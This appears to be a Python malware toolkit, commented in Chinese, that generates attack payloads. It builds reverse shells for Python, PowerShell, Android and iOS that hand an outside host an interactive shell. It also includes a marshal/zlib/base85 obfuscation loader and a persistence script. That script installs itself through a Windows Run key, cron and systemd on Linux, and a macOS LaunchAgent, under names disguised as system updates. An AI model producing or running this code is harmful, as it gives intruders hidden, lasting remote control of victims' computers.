#!/usr/bin/env python3
"""Payload 生成器"""
import base64
import zlib
import marshal
import random
import string

class PayloadGenerator:
    """生成各种平台的 Payload"""

    @staticmethod
    def generate_python_reverse_shell(host: str, port: int) -> str:
        """生成 Python 反向 Shell"""
        code = f"""
import socket,subprocess,os,sys
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{host}",{port}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
except:
    sys.exit()
"""
        return base64.b64encode(code.encode()).decode()

    @staticmethod
    def generate_windows_powershell(host: str, port: int) -> str:
        """生成 PowerShell 反向 Shell"""
        payload = f"""
$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}}
$client.Close()
"""
        return base64.b64encode(payload.encode('utf-16le')).decode()

    @staticmethod
    def generate_android_payload(host: str, port: int) -> str:
        """生成 Android Payload"""
        return f"""
// Android Reverse Shell
Runtime.getRuntime().exec(new String[]{{"/system/bin/sh","-c","exec 3<>/dev/tcp/{host}/{port}; cat <&3 | while read line; do $line >&3 2>&1; done"}});
"""

    @staticmethod
    def generate_ios_payload(host: str, port: int) -> str:
        """生成 iOS Payload"""
        return f"""
import Foundation
let task = Process()
task.launchPath = "/bin/bash"
task.arguments = ["-c", "bash -i >& /dev/tcp/{host}/{port} 0>&1"]
task.launch()
"""

    @staticmethod
    def obfuscate_python(code: str) -> str:
        """Python 代码混淆"""
        compiled = compile(code, '<string>', 'exec')
        marshaled = marshal.dumps(compiled)
        compressed = zlib.compress(marshaled)
        encoded = base64.b85encode(compressed)

        loader = f"""
import base64,zlib,marshal
exec(marshal.loads(zlib.decompress(base64.b85decode({encoded!r}))))
"""
        return loader

    @staticmethod
    def generate_random_string(length: int = 16) -> str:
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def generate_persistence_script() -> str:
        """生成持久化脚本"""
        return """
import os,sys,platform
from pathlib import Path

system = platform.system()
script = os.path.abspath(sys.argv[0])

if system == "Windows":
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
        r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ,
        sys.executable + ' "' + script + '"')
    winreg.CloseKey(key)

elif system == "Linux":
    cron = f"@reboot {sys.executable} {script} &"
    os.system(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -')
    service_lines = [
        "[Unit]",
        "Description=System Update Service",
        "After=network.target",
        "[Service]",
        f"ExecStart={sys.executable} {script}",
        "Restart=always",
        "[Install]",
        "WantedBy=default.target"
    ]
    service = "\\n".join(service_lines)
    service_path = Path.home() / ".config/systemd/user/update.service"
    service_path.parent.mkdir(parents=True, exist_ok=True)
    service_path.write_text(service)
    os.system("systemctl --user daemon-reload")
    os.system("systemctl --user enable update.service")

elif system == "Darwin":
    plist_lines = [
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
        '<plist version="1.0">',
        '<dict>',
        '    <key>Label</key><string>com.system.monitor</string>',
        '    <key>ProgramArguments</key>',
        f'    <array><string>{sys.executable}</string><string>{script}</string></array>',
        '    <key>RunAtLoad</key><true/>',
        '    <key>KeepAlive</key><true/>',
        '</dict>',
        '</plist>'
    ]
    plist = "\\n".join(plist_lines)
    plist_path = Path.home() / "Library/LaunchAgents/com.system.monitor.plist"
    plist_path.parent.mkdir(parents=True, exist_ok=True)
    plist_path.write_text(plist)
    os.system(f"launchctl load {{plist_path}}")
"""
